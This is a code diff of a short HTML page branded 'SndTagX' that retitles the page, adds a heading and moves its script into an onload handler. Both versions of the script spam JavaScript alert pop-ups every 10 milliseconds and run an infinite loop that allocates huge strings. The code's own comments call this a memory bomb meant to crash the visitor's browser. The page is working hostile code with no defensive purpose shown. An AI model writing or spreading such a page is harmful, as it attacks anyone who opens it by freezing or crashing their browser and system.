@@ -2,20 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Fuck Your Browser</title>
+    <title>SndTagX</title>
 </head>
 <body>
+    <h1>SndTagX ON TOP!</h1>
     <script>
-        // Spam pop-ups that don’t stop the script
-        setInterval(() => {
-            window.open("javascript:alert('SNDTAGX!');", "_blank", "width=200,height=100");
-        }, 10);
+        window.onload = function() {
+            // Spam pop-ups that don’t stop the script
+            setInterval(() => {
+                window.open("javascript:alert('SndTagX!');", "_blank", "width=200,height=100");
+            }, 10);
 
-        // Crash it with a memory bomb
-        let crashArray = [];
-        while (true) {
-            crashArray.push(new Array(1000000).join('x'));
-        }
+            // Crash it with a memory bomb
+            let crashArray = [];
+            while (true) {
+                crashArray.push(new Array(1000000).join('x'));
+            }
+        };
     </script>
 </body>
 </html>
